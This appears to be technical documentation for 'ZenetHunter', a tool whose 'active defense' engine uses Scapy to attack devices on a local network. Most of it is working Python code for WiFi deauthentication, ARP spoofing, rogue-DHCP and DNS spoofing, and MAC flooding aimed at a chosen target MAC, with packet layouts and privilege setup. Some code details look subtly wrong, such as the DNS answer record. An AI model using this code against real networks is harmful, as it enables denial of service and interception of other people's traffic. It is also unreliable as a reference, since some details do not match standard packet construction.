# Attack Engine Technical Documentation

Implementation details for ZenetHunter's active defense attack engines.

⚠️ **SENSITIVE TECHNICAL DOCUMENTATION** - Authorized Access Only

---

## Overview

The Attack Engine module provides low-level implementations of active defense techniques using raw packet manipulation. All implementations are built on top of Scapy for cross-platform compatibility and flexibility.

---

## Architecture

```
┌─────────────────────────────────────────────┐
│          Attack Engine Interface            │
│              (base.py)                       │
└──────────────────┬──────────────────────────┘
                   │
        ┌──────────┴──────────┐
        │                     │
┌───────▼────────┐   ┌───────▼────────┐
│  ScapyEngine   │   │  DummyEngine   │
│   (scapy.py)   │   │   (dummy.py)   │
└────────────────┘   └────────────────┘
```

### Components

1. **AttackEngine (Abstract Base)**
   - Defines the interface for all engine implementations
   - Location: `base.py`
   - Methods: `start_attack()`, `stop_attack()`, `scan_network()`

2. **ScapyAttackEngine (Production)**
   - Real implementation using Scapy library
   - Location: `scapy.py`
   - Requires: Root/Administrator privileges
   - Platform: Linux, macOS, Windows

3. **DummyAttackEngine (Testing)**
   - Mock implementation for testing
   - Location: `dummy.py`
   - No special permissions required

---

## Scapy Engine Implementation

### Core Features

- **Raw Packet Manipulation**: Direct control over all packet layers
- **Cross-Platform**: Supports Linux, macOS, and Windows
- **Permission Management**: Automatic capability detection
- **Safety Controls**: Built-in timeouts and emergency stop
- **Platform-Specific Optimizations**: Custom code paths for each OS

### Permission Requirements

#### Linux
```bash
# Option 1: Run as root
sudo python -m backend.main

# Option 2: Add CAP_NET_RAW capability
sudo setcap cap_net_raw+ep /path/to/python

# Verify capabilities
getcap /path/to/python
```

#### macOS
```bash
# Must run as root
sudo python -m backend.main

# Check current user
id
# Should show: uid=0(root)
```

#### Windows
```powershell
# Run PowerShell/CMD as Administrator
# Right-click -> "Run as Administrator"

# Or check programmatically
[Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains "S-1-5-32-544"
```

### Permission Check Implementation

```python
def check_permissions(self) -> bool:
    """Check if we have permissions for raw socket operations."""
    try:
        # Check if running as root
        if os.geteuid() == 0:
            return True
            
        # On Linux, check for NET_RAW capability
        if sys.platform == "linux":
            with open("/proc/self/status") as f:
                for line in f:
                    if line.startswith("CapEff:"):
                        cap_eff = int(line.split()[1], 16)
                        # NET_RAW is capability 13
                        if (cap_eff >> 13) & 1:
                            return True
                            
        return False
    except Exception:
        return False
```

---

## Attack Implementations

### 1. WiFi Deauthentication (KICK)

**Technical Details**:
- Sends 802.11 deauthentication frames
- Reason code: 7 (Class 3 frame received from nonassociated station)
- Requires monitor mode interface (or injection-capable interface)

**Implementation**:
```python
async def _run_kick_attack(self, target_mac: str, duration: int):
    """Execute WiFi Deauthentication attack."""
    # Construct Deauth frame
    pkt = (
        RadioTap()
        / Dot11(
            addr1=target_mac,           # Destination
            addr2=get_if_hwaddr(iface), # Source (AP)
            addr3=get_if_hwaddr(iface)  # BSSID
        )
        / Dot11Deauth(reason=7)
    )
    
    # Send in bursts
    while time.time() < end_time:
        await asyncio.to_thread(
            sendp, pkt, iface=iface, count=5, inter=0.1
        )
        await asyncio.sleep(1)
```

**Packet Structure**:
```
RadioTap Header (variable length)
├─ 802.11 Header
│  ├─ Frame Control (2 bytes): Type=Management, Subtype=Deauth
│  ├─ Duration (2 bytes)
│  ├─ Address 1 (6 bytes): Target MAC
│  ├─ Address 2 (6 bytes): AP MAC (spoofed)
│  └─ Address 3 (6 bytes): BSSID
└─ Deauth Body
   ├─ Reason Code (2 bytes): 7
   └─ FCS (4 bytes, auto)
```

### 2. ARP Spoofing (BLOCK)

**Technical Details**:
- Manipulates ARP cache entries
- Sends gratuitous ARP replies
- Continuous poisoning required

**Implementation**:
```python
async def _run_block_attack(self, target_mac: str, duration: int):
    """Execute ARP Spoofing attack."""
    gateway_ip = conf.route.route("0.0.0.0")[2]
    my_mac = get_if_hwaddr(conf.iface)
    
    # Craft ARP reply
    packet = (
        Ether(dst=target_mac, src=my_mac)
        / ARP(
            op=2,                 # ARP Reply
            pdst=gateway_ip,      # Target IP
            psrc=gateway_ip,      # Spoofed gateway IP
            hwdst=target_mac,     # Target MAC
            hwsrc=my_mac          # Our MAC (spoofed)
        )
    )
    
    # Send continuously
    while time.time() < end_time:
        await asyncio.to_thread(sendp, packet, iface=iface)
        await asyncio.sleep(2)  # ARP cache timeout ~60s
```

**Packet Structure**:
```
Ethernet Header (14 bytes)
├─ Destination MAC (6 bytes): Target
├─ Source MAC (6 bytes): Attacker
└─ EtherType (2 bytes): 0x0806 (ARP)

ARP Packet (28 bytes)
├─ Hardware Type (2 bytes): Ethernet (1)
├─ Protocol Type (2 bytes): IPv4 (0x0800)
├─ Hardware Size (1 byte): 6
├─ Protocol Size (1 byte): 4
├─ Opcode (2 bytes): Reply (2)
├─ Sender MAC (6 bytes): Attacker
├─ Sender IP (4 bytes): Gateway (spoofed)
├─ Target MAC (6 bytes): Victim
└─ Target IP (4 bytes): Gateway
```

### 3. DHCP Spoofing (DHCP_SPOOF)

**Technical Details**:
- Listens for DHCP DISCOVER
- Responds with malicious DHCP OFFER
- Can specify custom gateway and DNS

**Implementation**:
```python
async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int):
    """Execute DHCP Spoofing attack."""
    def handle_dhcp(packet):
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            # Create spoofed DHCP Offer
            offer = (
                Ether(dst=packet[Ether].src, src=my_mac)
                / IP(src=fake_dhcp_ip, dst="255.255.255.255")
                / UDP(sport=67, dport=68)
                / BOOTP(
                    op=2,                    # BOOTP Reply
                    xid=packet[BOOTP].xid,   # Transaction ID
                    yiaddr="192.168.1.100",  # Offered IP
                    siaddr=fake_dhcp_ip,     # DHCP server
                    chaddr=packet[BOOTP].chaddr
                )
                / DHCP(options=[
                    ("message-type", "offer"),
                    ("server_id", fake_dhcp_ip),
                    ("lease_time", 3600),
                    ("router", fake_dhcp_ip),      # Malicious gateway
                    ("name_server", fake_dhcp_ip), # Malicious DNS
                    "end"
                ])
            )
            sendp(offer, iface=iface, verbose=False)
    
    # Sniff and respond
    sniff(filter="udp and port 67", prn=handle_dhcp, timeout=duration)
```

### 4. DNS Spoofing (DNS_SPOOF)

**Technical Details**:
- Intercepts DNS queries (UDP port 53)
- Crafts malicious DNS responses
- Race condition with legitimate DNS server

**Implementation**:
```python
async def _run_dns_spoof_attack(self, target_mac: str, duration: int):
    """Execute DNS Spoofing attack."""
    redirect_ip = "127.0.0.1"  # Redirect target
    
    def handle_dns(packet):
        if DNS in packet and packet[DNS].qr == 0:  # Query
            # Create spoofed response
            spoofed = (
                Ether(dst=packet[Ether].src, src=my_mac)
                / IP(src=packet[IP].dst, dst=packet[IP].src)
                / UDP(sport=53, dport=packet[UDP].sport)
                / DNS(
                    id=packet[DNS].id,
                    qr=1,                    # Response
                    aa=1,                    # Authoritative
                    qd=packet[DNS].qd,       # Question
                    an=DNSQR(
                        rrname=packet[DNS].qd.qname,
                        rdata=redirect_ip,   # Malicious IP
                        type=packet[DNS].qd.qtype
                    )
                )
            )
            sendp(spoofed, iface=iface, verbose=False)
    
    sniff(filter="udp and port 53", prn=handle_dns, timeout=duration)
```

### 5. MAC Flooding (MAC_FLOOD)

**Technical Details**:
- Generates random source MAC addresses
- Floods switch CAM table
- High packet rate (100-1000 pps)

**Implementation**:
```python
async def _run_mac_flood_attack(self, target_mac: str, duration: int):
    """Execute MAC Flooding attack."""
    import random
    
    while time.time() < end_time:
        # Generate random MAC
        fake_mac = ":".join([
            f"{random.randint(0, 255):02x}" for _ in range(6)
        ])
        
        # Send packet with fake source
        flood_packet = (
            Ether(src=fake_mac, dst=target_mac)
            / IP() / ICMP()
        )
        
        await asyncio.to_thread(sendp, flood_packet, iface=iface)
        await asyncio.sleep(0.01)  # 100 pps
```

---

## Platform-Specific Implementations

### Linux

**Advantages**:
- Full raw socket support
- Capabilities system (CAP_NET_RAW)
- Best performance

**Network Interface Detection**:
```python
# Get default interface
iface = conf.iface  # Usually 'eth0', 'wlan0', etc.

# Get gateway
gw_route = conf.route.route("0.0.0.0")
gateway_ip = gw_route[2]
```

### macOS

**Advantages**:
- Good raw socket support
- BSD-based networking stack

**Challenges**:
- Requires root (no capabilities)
- Different interface naming (en0, en1)

**Interface Detection**:
```python
from app.core.engine.features_macos import MacOSNetworkFeatures

macos = MacOSNetworkFeatures()
gateway_ip = await macos.get_gateway_ip()
iface = await macos.get_default_interface()
```

### Windows

**Advantages**:
- Wincap/Npcap support

**Challenges**:
- Limited raw socket support
- Different interface GUIDs
- Some operations may fail

**Interface Detection**:
```python
# Use ipconfig to get gateway
result = await asyncio.create_subprocess_exec(
    "ipconfig",
    stdout=asyncio.subprocess.PIPE
)
stdout, _ = await result.communicate()
# Parse output for "Default Gateway"
```

---

## Safety Mechanisms

### 1. Operation Timeouts

All operations have maximum duration:
```python
max_duration = request.duration + 10
try:
    await asyncio.wait_for(
        self.engine.start_attack(mac, attack_type, duration),
        timeout=max_duration
    )
except TimeoutError:
    await self.engine.stop_attack(mac)
    raise
```

### 2. Emergency Stop

Operations can be cancelled at any time:
```python
async def stop_attack(self, target_mac: str):
    """Emergency stop mechanism."""
    if target_mac in self._running_attacks:
        self._running_attacks[target_mac] = False
        # Engine checks this flag periodically
```

### 3. Rate Limiting

Built-in delays prevent network flooding:
```python
# ARP: 2-second intervals
await asyncio.sleep(2)

# MAC Flood: 10ms intervals (100 pps max)
await asyncio.sleep(0.01)
```

---

## Testing

### Unit Tests

```python
# tests/test_scapy_engine.py

async def test_permission_check():
    engine = ScapyAttackEngine()
    has_perms = engine.check_permissions()
    assert isinstance(has_perms, bool)

async def test_arp_spoof_packet():
    engine = ScapyAttackEngine()
    packet = engine._craft_arp_spoof_packet(
        target_mac="aa:bb:cc:dd:ee:ff",
        gateway_ip="192.168.1.1"
    )
    assert packet[ARP].op == 2
    assert packet[ARP].pdst == "192.168.1.1"
```

### Integration Tests

```bash
# Requires root and test network
pytest tests/test_engine.py --run-integration --as-root
```

---

## Performance Considerations

### Packet Rate Limits

| Operation | Rate | Notes |
|-----------|------|-------|
| ARP Spoof | 0.5 pps | Every 2 seconds |
| DHCP Spoof | Event-driven | Respond to DISCOVER |
| DNS Spoof | Event-driven | Respond to queries |
| MAC Flood | 100 pps | Configurable via intensity |
| Deauth | 5 pps | Burst of 5, then 1s pause |

### Memory Usage

- **Base**: ~50-100 MB (Scapy loaded)
- **Per Operation**: ~10-20 MB (packet buffers)
- **Sniffing**: ~100 MB (capture buffer)

### CPU Usage

- **Idle**: <5%
- **Active Operation**: 10-30%
- **High-intensity Flood**: 50-80%

---

## Security Considerations

### Audit Logging

All operations are logged:
```python
logger.info(
    f"[ScapyEngine] Starting {attack_type} on {target_mac} "
    f"for {duration}s"
)
```

### Permission Validation

Always check before executing:
```python
if not self.check_permissions():
    raise PermissionError("Root/Admin required")
```

### Safe Defaults

- Maximum duration: 3600s (1 hour)
- Default intensity: 5/10 (medium)
- Automatic cleanup on exit

---

## Troubleshooting

### Common Issues

1. **"Permission denied" errors**
   - Solution: Run as root or add CAP_NET_RAW

2. **"Interface not found"**
   - Solution: Check `ip link` or `ifconfig` output

3. **Packets not being sent**
   - Solution: Check firewall rules, verify interface is up

4. **High CPU usage**
   - Solution: Reduce intensity level

---

## References

- [Scapy Documentation](https://scapy.readthedocs.io/)
- [IEEE 802.11 Spec](https://standards.ieee.org/standard/802_11-2020.html)
- [RFC 826 - ARP](https://tools.ietf.org/html/rfc826)
- [RFC 2131 - DHCP](https://tools.ietf.org/html/rfc2131)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)

---

**⚠️ This is highly sensitive technical documentation. Unauthorized access, copying, or distribution is strictly prohibited.**
